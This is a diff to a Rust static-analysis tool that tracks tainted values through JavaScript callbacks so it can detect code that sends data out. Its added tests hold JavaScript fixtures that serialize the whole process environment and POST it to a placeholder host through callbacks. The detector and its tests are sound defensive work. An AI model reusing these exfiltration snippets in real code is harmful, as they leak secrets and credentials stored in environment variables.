@@ -2645,22 +2645,88 @@ impl<'p> Eval<'p> {
 
     /// The functions a call's arguments are (a callback, a function's name).
     fn sc_fn_args(&mut self, node: NodeId, scope: ScopeId) -> Vec<FnId> {
-        let m = self.m;
         let arg_nodes = self.a().list(node, jt::B).to_vec();
         let mut out = Vec::new();
         for an in arg_nodes {
-            let k = self.a().kind(an);
-            if self.a().is_function(an) {
-                out.push(self.p.mods[m as usize].fid_at[an as usize]);
-            } else if matches!(k, Kind::Identifier | Kind::MemberExpression) {
-                for d in self.p.descs_of_expr(m, an, scope, 0) {
-                    if let D::Fn(f) = d {
-                        out.push(f);
+            out.extend(self.sc_fn_of(an, scope));
+        }
+        dedupe(out)
+    }
+
+    /// The functions an argument is: a function written there, or a name or a member that holds one.
+    fn sc_fn_of(&mut self, an: NodeId, scope: ScopeId) -> Vec<FnId> {
+        let m = self.m;
+        let k = self.a().kind(an);
+        if self.a().is_function(an) {
+            return vec![self.p.mods[m as usize].fid_at[an as usize]];
+        }
+        if !matches!(k, Kind::Identifier | Kind::MemberExpression) {
+            return Vec::new();
+        }
+        let mut out = Vec::new();
+        for d in self.p.descs_of_expr(m, an, scope, 0) {
+            if let D::Fn(f) = d {
+                out.push(f);
+            }
+        }
+        out
+    }
+
+    /// D-19: a call of a parameter (of this function, or of one around it) with values: what it is called with,
+    /// for the function's summary (Func::param_calls), so that the function a caller gives there is run with them.
+    fn sc_param_called(&mut self, callee_val: &V, args: &[V], spread: isize) {
+        if spread >= 0 || !args.iter().any(|a| a.tainted()) {
+            return;
+        }
+        let given: Vec<V> = args.iter().map(|a| a.plain()).collect();
+        for &key in callee_val.params.iter() {
+            if key & MEMBER_KEY == 0 && key_index(key) != RECV_INDEX && key_index(key) < MAX_PARAMS {
+                self.pc_adds.push((key, given.clone()));
+            }
+        }
+    }
+
+    /// D-19: the functions a call gives the script's functions `fids` where they call a parameter with values
+    /// (Func::param_calls), run with those values, as a built-in's callback is run: `withEnv((d) => send(d))`, where
+    /// `withEnv(cb)` calls `cb(JSON.stringify(process.env))`. A value the callee was given itself is what this call
+    /// gives it (`pass(data, cb)` calling `cb(x)` on its `x`); a parameter of this function given there is called
+    /// with those values too (`outer(cb) { inner(cb); }`). A function given is a parameter this caller uses, so it
+    /// is read again when what the callee calls the parameter with changes.
+    fn sc_param_calls(&mut self, node: NodeId, fids: &[FnId], args: &[V], spread: isize, scope: ScopeId) {
+        let arg_nodes = self.a().list(node, jt::B).to_vec();
+        let mut given_fns: Vec<(usize, Vec<FnId>)> = Vec::new();
+        for (i, &an) in arg_nodes.iter().enumerate() {
+            if spread >= 0 && i as isize >= spread {
+                break;
+            }
+            let cbs = self.sc_fn_of(an, scope);
+            if !cbs.is_empty() {
+                given_fns.push((i, cbs));
+            }
+        }
+        for &fid in fids {
+            for (i, _) in &given_fns {
+                self.uses.entry(fid).or_default().insert(*i);
+            }
+            let calls: Vec<(usize, Vec<V>)> =
+                self.p.fns[fid as usize].param_calls.iter().map(|(&i, g)| (i, g.clone())).collect();
+            for (i, given) in calls {
+                let cb_args: Vec<V> = given.iter().map(|g| bind_given(g, fid, args, spread)).collect();
+                if !cb_args.iter().any(|a| a.tainted()) {
+                    continue;
+                }
+                if let Some((_, cbs)) = given_fns.iter().find(|(k, _)| *k == i) {
+                    let (cbs, line) = (cbs.clone(), self.call_line(node));
+                    self.apply(node, &cbs, &cb_args, -1, line, false);
+                }
+                let here = super::eval::bound(args, spread, -1, i);
+                for &key in here.params.iter() {
+                    if key & MEMBER_KEY == 0 && key_index(key) != RECV_INDEX {
+                        self.pc_adds.push((key, cb_args.clone()));
                     }
                 }
             }
         }
-        dedupe(out)
     }
 
     /// Callbacks given a value: each parameter holds it (a read's callback
@@ -3131,6 +3197,9 @@ impl<'p> Eval<'p> {
         let (fids, how) = (tg.0.clone(), tg.1);
         let definite = how == descs::How::Definite;
         let line = self.call_line(node);
+        if fids.is_empty() && !member {
+            self.sc_param_called(callee_val, args, spread);
+        }
         // (a method of its own, called on a parameter: that member of the parameter, D-16: prisma's
         // `env.readProjectPackageJson()`; a built-in one gives back what the parameter holds)
         let own = member && name.as_deref().is_some_and(|n| !is_one(n, PASS_THROUGH) && !env_holder_name(n));
@@ -3143,6 +3212,7 @@ impl<'p> Eval<'p> {
             }
             v = self.apply(node, &fids, args, spread, line, false);
             self.recv_val = None;
+            self.sc_param_calls(node, &fids, args, spread, scope);
             if !definite {
                 let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                 v = v.union(&union_all(&plains)).union(&held);
@@ -3888,6 +3958,43 @@ mod tests {
         // a function of the os module given as a value
         let src = format!("const os = require('os');\nfunction tryGet(f) {{ return f(); }}\n{}", post("tryGet(os.hostname)"));
         assert_eq!(sent(&src), found("identity", "hostname"));
+    }
+
+    #[test]
+    fn a_callback_given_what_a_function_calls_its_parameter_with() {
+        // D-19: the tree ran a built-in's callback with what it was given, not a parameter the script's function
+        // calls: `withEnv(cb)` calling `cb(JSON.stringify(process.env))`, given `(d) => send(d)`
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }})", HOST, v);
+        let whole = || found("environment", "the whole environment");
+        assert_eq!(
+            sent(&format!("function withEnv(cb) {{ cb(JSON.stringify(process.env)); }}\nwithEnv((d) => {});\n", post("d"))),
+            whole()
+        );
+        // a named function, the data at its second position
+        assert_eq!(
+            sent(&format!(
+                "function withEnv(cb) {{ cb('x', JSON.stringify(process.env)); }}\nfunction send(t, d) {{ {}; }}\n\
+                 withEnv(send);\n",
+                post("d")
+            )),
+            whole()
+        );
+        // what the caller gives the function, handed to the callback; a callback handed on to another function
+        assert_eq!(
+            sent(&format!("function pass(x, cb) {{ cb(x); }}\npass(JSON.stringify(process.env), (d) => {});\n", post("d"))),
+            whole()
+        );
+        assert_eq!(
+            sent(&format!(
+                "function inner(cb) {{ cb(JSON.stringify(process.env)); }}\nfunction outer(cb) {{ inner(cb); }}\n\
+                 outer((d) => {});\n",
+                post("d")
+            )),
+            whole()
+        );
+        // a callback given a constant, or one that sends nothing
+        assert_eq!(sent(&format!("function f(cb) {{ cb('x'); }}\nf((d) => {});\n", post("d"))), None);
+        assert_eq!(sent("function f(cb) { cb(JSON.stringify(process.env)); }\nf((d) => console.log(d.length));\n"), None);
     }
 
     #[test]
@@ -4648,4 +4755,27 @@ mod tests {
         );
         assert_eq!(runs(&once), Some("run"));
     }
+}
+
+/// D-19: a value a function calls a parameter with (Func::param_calls), as a call that gives the function `args`
+/// gives it: what it read itself, and in place of each of the function's own parameters what the call gives there
+/// (an enclosing function's are kept: the call is made inside it).
+fn bind_given(g: &V, fid: FnId, args: &[V], spread: isize) -> V {
+    let mut out = if g.src {
+        V::new(true, g.origin, g.fname.clone(), g.via.clone(), V::empty().params, g.clean, g.built, 0).with_sc(g.sc.clone())
+    } else {
+        V::empty()
+    };
+    let mut kept: Vec<u64> = Vec::new();
+    for &k in g.params.iter() {
+        if key_owner(k) == fid && k & MEMBER_KEY == 0 && key_index(k) != RECV_INDEX {
+            out = out.union(&super::eval::bound(args, spread, -1, key_index(k)).plain());
+        } else if key_owner(k) != fid {
+            kept.push(k);
+        }
+    }
+    if !kept.is_empty() {
+        out = out.union(&V::new(false, None, None, None, Rc::from(kept), g.clean, g.built, 0));
+    }
+    out
 }
